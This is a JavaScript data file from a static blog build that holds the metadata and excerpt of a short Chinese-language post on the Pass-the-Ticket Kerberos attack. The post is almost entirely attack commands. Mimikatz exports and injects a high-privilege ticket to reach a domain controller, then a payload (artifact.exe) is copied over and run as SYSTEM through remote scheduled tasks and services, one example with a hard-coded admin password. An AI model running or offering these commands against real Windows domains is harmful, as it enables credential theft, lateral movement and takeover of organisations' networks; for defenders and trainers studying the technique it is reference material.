const s=JSON.parse('{"key":"v-63a2d810","path":"/IntranetSec/WindowsSec/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88PTT%EF%BC%89.html","title":"票据传递攻击（PTT）","lang":"zh-CN","frontmatter":{"title":"票据传递攻击（PTT）","date":"2022-12-02T00:00:00.000Z","category":["内网安全"],"tag":["Windows系统内网安全","横向移动"],"description":"票据传递攻击（PTT） 票据传递攻击（Pass The Ticket），常用来做后渗透权限维持 利用内存中的高权限票据，导入内存，然后控制域控来打穿域。（黄金票据、白银票据） 攻击步骤 1.导出票据 mimikatz privilege::debug mimikatz sekurlsa::tickets /export 2.清除内存中的票据 shell klist mimikatz kerberos::purge 3.将高权限票据注入内存 mimikatz kerberos::ptt [0;5dd4d1]-2-1-40e10000-Administrator@krbtgt-HACKER.COM.kirbi mimikatz kerberos::tgt #查票 4.访问域控 shell dir \\\\\\\\controlfish\\\\c$ #这里一定要计算机名或域名 shell dir \\\\\\\\controlfish.hacker.com\\\\c$ 5.执行各种命令 net time \\\\\\\\192.168.1.4 #查看时间 tasklist /s 192.168.1.4 #查看进程 dir \\\\\\\\192.168.1.4\\\\c$ #查看C盘 #配合计划任务攻击夺取另一台内网机器的shell copy C:\\\\Users\\\\admin\\\\Desktop\\\\artifact.exe \\\\\\\\controlfish.hacker.com\\\\C$ #拷贝文件到目标主机C盘下 schtasks /create /s controlfish.hacker.com /tn shellname /sc onstart /tr c:\\\\artifact.exe /ru system /f schtasks /run /s controlfish.hacker.com /i /tn \\"shellname\\" schtasks /create /u administrator /p Aa123456 /s controlfish.hacker.com /tn shellname /sc onstart /tr c:\\\\artifact.exe /ru system /f #创建计划任务 schtasks /run /u administrator /p Aa123456 /s controlfish.hacker.com /i /tn \\"shellname\\" #运行计划任务 schtasks /query /s controlfish.hacker.com /u administrator /p Aa123456 /TN c #查看计划任务 SCHTASKS /DELETE /s controlfish.hacker.com /TN \\"shellname1\\" /f #强制删除计划任务 #配合服务夺取另一台内网机器的shell sc \\\\\\\\192.168.1.4 create servername binpath= \\"cmd.exe /c c:\\\\artifact.exe\\" #创建服务 sc \\\\\\\\192.168.1.4 start servername #启动服务","head":[["meta",{"property":"og:url","content":"https://hzyxy.github.io/IntranetSec/WindowsSec/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88PTT%EF%BC%89.html"}],["meta",{"property":"og:site_name","content":"XY"}],["meta",{"property":"og:title","content":"票据传递攻击（PTT）"}],["meta",{"property":"og:description","content":"票据传递攻击（PTT） 票据传递攻击（Pass The Ticket），常用来做后渗透权限维持 利用内存中的高权限票据，导入内存，然后控制域控来打穿域。（黄金票据、白银票据） 攻击步骤 1.导出票据 mimikatz privilege::debug mimikatz sekurlsa::tickets /export 2.清除内存中的票据 shell klist mimikatz kerberos::purge 3.将高权限票据注入内存 mimikatz kerberos::ptt [0;5dd4d1]-2-1-40e10000-Administrator@krbtgt-HACKER.COM.kirbi mimikatz kerberos::tgt #查票 4.访问域控 shell dir \\\\\\\\controlfish\\\\c$ #这里一定要计算机名或域名 shell dir \\\\\\\\controlfish.hacker.com\\\\c$ 5.执行各种命令 net time \\\\\\\\192.168.1.4 #查看时间 tasklist /s 192.168.1.4 #查看进程 dir \\\\\\\\192.168.1.4\\\\c$ #查看C盘 #配合计划任务攻击夺取另一台内网机器的shell copy C:\\\\Users\\\\admin\\\\Desktop\\\\artifact.exe \\\\\\\\controlfish.hacker.com\\\\C$ #拷贝文件到目标主机C盘下 schtasks /create /s controlfish.hacker.com /tn shellname /sc onstart /tr c:\\\\artifact.exe /ru system /f schtasks /run /s controlfish.hacker.com /i /tn \\"shellname\\" schtasks /create /u administrator /p Aa123456 /s controlfish.hacker.com /tn shellname /sc onstart /tr c:\\\\artifact.exe /ru system /f #创建计划任务 schtasks /run /u administrator /p Aa123456 /s controlfish.hacker.com /i /tn \\"shellname\\" #运行计划任务 schtasks /query /s controlfish.hacker.com /u administrator /p Aa123456 /TN c #查看计划任务 SCHTASKS /DELETE /s controlfish.hacker.com /TN \\"shellname1\\" /f #强制删除计划任务 #配合服务夺取另一台内网机器的shell sc \\\\\\\\192.168.1.4 create servername binpath= \\"cmd.exe /c c:\\\\artifact.exe\\" #创建服务 sc \\\\\\\\192.168.1.4 start servername #启动服务"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"XY"}],["meta",{"property":"article:tag","content":"Windows系统内网安全"}],["meta",{"property":"article:tag","content":"横向移动"}],["meta",{"property":"article:published_time","content":"2022-12-02T00:00:00.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"票据传递攻击（PTT）\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-12-02T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"XY\\",\\"url\\":\\"https://hzyxy.github.io\\"}]}"]]},"headers":[{"level":2,"title":"票据传递攻击（PTT）","slug":"票据传递攻击-ptt","link":"#票据传递攻击-ptt","children":[{"level":3,"title":"攻击步骤","slug":"攻击步骤","link":"#攻击步骤","children":[]}]}],"git":{},"readingTime":{"minutes":1.22,"words":367},"filePathRelative":"IntranetSec/WindowsSec/票据传递攻击（PTT）.md","localizedDate":"2022年12月2日","excerpt":"<h2> 票据传递攻击（PTT）</h2>\\n<ul>\\n<li>票据传递攻击（Pass The Ticket），常用来做后渗透权限维持</li>\\n<li>利用内存中的高权限票据，导入内存，然后控制域控来打穿域。（黄金票据、白银票据）</li>\\n</ul>\\n<h3> 攻击步骤</h3>\\n<div class=\\"language-bash line-numbers-mode\\" data-ext=\\"sh\\"><pre class=\\"language-bash\\"><code><span class=\\"token number\\">1</span>.导出票据\\nmimikatz privilege::debug \\nmimikatz sekurlsa::tickets /export\\n\\n<span class=\\"token number\\">2</span>.清除内存中的票据\\nshell klist\\nmimikatz kerberos::purge\\n\\n<span class=\\"token number\\">3</span>.将高权限票据注入内存\\nmimikatz kerberos::ptt <span class=\\"token punctuation\\">[</span><span class=\\"token number\\">0</span><span class=\\"token punctuation\\">;</span>5dd4d1<span class=\\"token punctuation\\">]</span>-2-1-40e10000-Administrator@krbtgt-HACKER.COM.kirbi \\nmimikatz kerberos::tgt <span class=\\"token comment\\">#查票</span>\\n\\n<span class=\\"token number\\">4</span>.访问域控\\nshell <span class=\\"token function\\">dir</span> <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span>controlfish<span class=\\"token punctuation\\">\\\\</span>c$ <span class=\\"token comment\\">#这里一定要计算机名或域名</span>\\nshell <span class=\\"token function\\">dir</span> <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span>controlfish.hacker.com<span class=\\"token punctuation\\">\\\\</span>c$\\n\\n<span class=\\"token number\\">5</span>.执行各种命令\\nnet <span class=\\"token function\\">time</span> <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span><span class=\\"token number\\">192.168</span>.1.4 <span class=\\"token comment\\">#查看时间</span>\\ntasklist /s <span class=\\"token number\\">192.168</span>.1.4 <span class=\\"token comment\\">#查看进程</span>\\n<span class=\\"token function\\">dir</span> <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span><span class=\\"token number\\">192.168</span>.1.4<span class=\\"token punctuation\\">\\\\</span>c$ <span class=\\"token comment\\">#查看C盘</span>\\n\\n<span class=\\"token comment\\">#配合计划任务攻击夺取另一台内网机器的shell</span>\\ncopy C:<span class=\\"token punctuation\\">\\\\</span>Users<span class=\\"token punctuation\\">\\\\</span>admin<span class=\\"token punctuation\\">\\\\</span>Desktop<span class=\\"token punctuation\\">\\\\</span>artifact.exe <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span>controlfish.hacker.com<span class=\\"token punctuation\\">\\\\</span>C$ <span class=\\"token comment\\">#拷贝文件到目标主机C盘下</span>\\nschtasks /create /s controlfish.hacker.com /tn shellname /sc onstart /tr c:<span class=\\"token punctuation\\">\\\\</span>artifact.exe /ru system /f\\nschtasks /run /s controlfish.hacker.com /i /tn <span class=\\"token string\\">\\"shellname\\"</span>\\n\\nschtasks /create /u administrator /p Aa123456 /s controlfish.hacker.com /tn shellname /sc onstart /tr c:<span class=\\"token punctuation\\">\\\\</span>artifact.exe /ru system /f <span class=\\"token comment\\">#创建计划任务</span>\\nschtasks /run /u administrator /p Aa123456 /s controlfish.hacker.com /i /tn <span class=\\"token string\\">\\"shellname\\"</span> <span class=\\"token comment\\">#运行计划任务</span>\\nschtasks /query /s controlfish.hacker.com /u administrator /p Aa123456 /TN c <span class=\\"token comment\\">#查看计划任务</span>\\n\\nSCHTASKS /DELETE /s controlfish.hacker.com /TN <span class=\\"token string\\">\\"shellname1\\"</span> /f <span class=\\"token comment\\">#强制删除计划任务</span>\\n\\n<span class=\\"token comment\\">#配合服务夺取另一台内网机器的shell</span>\\nsc <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span><span class=\\"token number\\">192.168</span>.1.4 create servername <span class=\\"token assign-left variable\\">binpath</span><span class=\\"token operator\\">=</span> <span class=\\"token string\\">\\"cmd.exe /c c:<span class=\\"token entity\\" title=\\"\\\\a\\">\\\\a</span>rtifact.exe\\"</span> <span class=\\"token comment\\">#创建服务</span>\\nsc <span class=\\"token punctuation\\">\\\\</span><span class=\\"token punctuation\\">\\\\</span><span class=\\"token number\\">192.168</span>.1.4 start servername <span class=\\"token comment\\">#启动服务</span>\\n</code></pre><div class=\\"line-numbers\\" aria-hidden=\\"true\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{s as data};
